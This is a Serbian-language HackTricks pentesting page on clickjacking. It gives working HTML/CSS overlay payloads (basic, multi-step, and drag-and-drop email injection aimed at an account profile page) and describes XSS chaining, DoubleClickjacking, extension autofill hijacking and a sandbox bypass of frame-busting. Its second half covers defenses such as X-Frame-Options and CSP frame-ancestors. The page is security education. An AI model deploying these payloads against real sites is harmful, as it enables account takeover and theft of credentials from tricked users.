# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Šta je Clickjacking

U clickjacking napadu, **korisnik** je **prevaren** da **klikne** na **element** na web stranici koji je ili **nevidljiv** ili prikriven kao neki drugi element. Ova manipulacija može dovesti do neželjenih posledica za korisnika, kao što su preuzimanje malvera, preusmeravanje na zlonamerne web stranice, odavanje kredencijala ili osetljivih informacija, prenos novca ili online kupovina proizvoda.

### Trik: prepopunjavanje formi

Ponekad je moguće **popuniti vrednosti polja formulara koristeći GET parametre pri učitavanju stranice**. Napadač može zloupotrebiti ovo ponašanje da popuni formular proizvoljnim podacima i pošalje clickjacking payload tako da korisnik pritisne dugme Submit.

### Popunjavanje formulara pomoću Drag\&Drop

Ako vam treba da korisnik **popuni formular**, ali ne želite direktno da ga zamolite da unese određene informacije (poput email-a i/ili specifične lozinke koju znate), možete ga jednostavno zamoliti da **Drag\&Drop** nešto što će uneti podatke kojima upravljate, kao u [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Osnovni Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Višestepeni Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Ako ste identifikovali **XSS napad koji zahteva da korisnik klikne** na neki element da bi **pokrenuo** XSS i stranica je **ranjiva na clickjacking**, možete to iskoristiti da prevarite korisnika da klikne na dugme/link.\
Primer:\
Pronašli ste **self XSS** u nekim privatnim podacima naloga (podatke koje **samo vi možete postaviti i pročitati**). Stranica sa **formom** za postavljanje tih podataka je **ranjiva** na **Clickjacking** i možete **predpopuniti** **formu** GET parametrima.\
Napadač bi mogao pripremiti **Clickjacking** napad na tu stranicu **predpopunjavajući** **formu** sa **XSS payload-om** i **prevariti** **korisnika** da **pošalje** formu. Dakle, **kada se forma pošalje** i vrednosti budu izmenjene, **korisnik će izvršiti XSS**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), ova tehnika podrazumeva da se žrtva navede da dvaput klikne na dugme na prilagođenoj stranici postavljenoj na tačno određenom mestu, i koristi razlike u vremenu između mousedown i onclick događaja da se tokom dvostrukog klika učita stranica žrtve tako da **žrtva zapravo klikne na legitimno dugme na stranici žrtve**.

Primer se može videti u ovom videu: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

Primer koda može se naći na [ovoj stranici](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Ova tehnika omogućava prevaru korisnika da klikne na jedno mesto na stranici žrtve zaobilazeći svaku zaštitu protiv clickjacking-a. Dakle, napadač treba da pronađe **osetljive akcije koje se mogu uraditi jednim klikom, kao što su OAuth prompti za prihvatanje dozvola**.

### Browser extensions: DOM-based autofill clickjacking

Pored iframovanja stranica žrtve, napadači mogu ciljati UI elemente browser ekstenzija koji se injektuju u stranicu. Password managers prikazuju autofill padajuće liste pored fokusiranih inputa; fokusiranjem polja pod kontrolom napadača i skrivanjem/zaklanjanjem padajućeg menija ekstenzije (trikovi sa opacity/overlay/top-layer), prisiljeni klik korisnika može izabrati sačuvan unos i popuniti osetljive podatke u inpute pod kontrolom napadača. Ova varijanta ne zahteva izlaganje iframe-a i radi potpuno putem DOM/CSS manipulacije.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Odbrane na strani klijenta

Skripte koje se izvršavaju na strani klijenta mogu preduzeti mere za sprečavanje Clickjacking-a:

- Osiguravanje da je prozor aplikacije glavni (top) prozor.
- Postavljanje da svi frame-ovi budu vidljivi.
- Onemogućavanje klika na nevidljive frame-ove.
- Otkrivanje i obaveštavanje korisnika o potencijalnim pokušajima Clickjacking-a.

Međutim, ovi frame-busting skripti mogu biti zaobiđeni:

- **Podešavanja bezbednosti pregledača:** Neki pregledači mogu blokirati ove skripte na osnovu svojih sigurnosnih podešavanja ili nedostatka podrške za JavaScript.
- **HTML5 iframe sandbox Attribute:** Napadač može neutralisati frame buster skripte postavljanjem sandbox atributa sa allow-forms ili allow-scripts vrednostima bez allow-top-navigation. Ovo sprečava iframe da verifikuje da li je top prozor, npr.
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Vrednosti allow-forms i allow-scripts omogućavaju akcije unutar iframe-a dok onemogućavaju top-level navigaciju. Da bi se obezbedila predviđena funkcionalnost ciljanog sajta, u zavisnosti od tipa napada mogu biti potrebne dodatne dozvole kao što su allow-same-origin i allow-modals. Poruke u konzoli pregledača mogu ukazati koje dozvole treba omogućiti.

### Odbrane na serverskoj strani

#### X-Frame-Options

The **X-Frame-Options HTTP response header** informs browsers about the legitimacy of rendering a page in a <frame> or <iframe>, helping to prevent Clickjacking:

- X-Frame-Options: deny - Nijedan domen ne može da prikaže sadržaj u okviru.
- X-Frame-Options: sameorigin - Samo trenutni sajt može da prikaže sadržaj u okviru.
- X-Frame-Options: allow-from https://trusted.com - Samo navedani 'uri' može da prikaže stranicu u okviru.
- Napomena o ograničenjima: ako pregledač ne podržava ovu direktivu, možda neće raditi. Neki pregledači preferiraju CSP frame-ancestors direktivu.

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** je preporučeni metod za zaštitu od Clickjacking-a:

- frame-ancestors 'none' - Slično X-Frame-Options: deny.
- frame-ancestors 'self' - Slično X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Slično X-Frame-Options: allow-from.

Na primer, sledeći CSP dozvoljava uokvirivanje samo sa iste domene:

Content-Security-Policy: frame-ancestors 'self';

Dalji detalji i složeniji primeri nalaze se u [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) i [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) sa child-src i frame-src

**Content Security Policy (CSP)** je bezbednosna mera koja pomaže u sprečavanju Clickjacking-a i drugih napada ubacivanjem koda tako što specificira koje izvore pregledač treba da dozvoli za učitavanje sadržaja.

#### frame-src Directive

- Definiše validne izvore za okvire.
- Specifičnija je od default-src direktive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ova politika dozvoljava frames sa istog origin-a (self) i https://trusted-website.com.

#### child-src Directive

- Uvedena u CSP level 2 da postavi važeće izvore za web workers i frames.
- Služi kao fallback za frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ova politika dozvoljava frames i workers sa istog porekla (self) i https://trusted-website.com.

**Napomene o upotrebi:**

- Zastarevanje: child-src se postepeno ukida u korist frame-src i worker-src.
- Fallback ponašanje: Ako frame-src nedostaje, child-src se koristi kao fallback za frames. Ako oba nedostaju, koristi se default-src.
- Stroga definicija izvora: Uključite samo pouzdane izvore u direktive kako biste sprečili zloupotrebu.

#### JavaScript Frame-Breaking Scripts

Iako nije potpuno nepogrešivo, JavaScript-based frame-busting scripts mogu se koristiti za sprečavanje da se web stranica prikaže unutar frejma. Primer:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Korišćenje Anti-CSRF Tokens

- **Token Validation:** Koristite anti-CSRF tokens u web aplikacijama kako biste osigurali da su zahtevi koji menjaju stanje namerno napravljeni od strane korisnika, a ne putem Clickjacked stranice.

## Reference

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
